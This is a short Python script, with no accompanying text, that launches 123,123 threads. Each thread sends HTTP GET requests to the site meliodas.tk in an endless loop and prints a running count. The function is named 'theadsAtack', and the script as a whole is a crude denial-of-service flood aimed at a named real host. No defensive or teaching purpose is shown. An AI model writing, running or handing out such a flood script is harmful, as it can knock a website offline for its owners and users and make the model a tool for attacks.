import requests,threading
cont = 0

theads = 123123
def theadsAtack(i,otro):
    while True:
        requests.get('http://meliodas.tk/') 
        global cont
        cont+=1
        print(i,cont)



for i in range(theads):
    thread = threading.Thread(target=theadsAtack, args=(i,''))
    thread.start()
    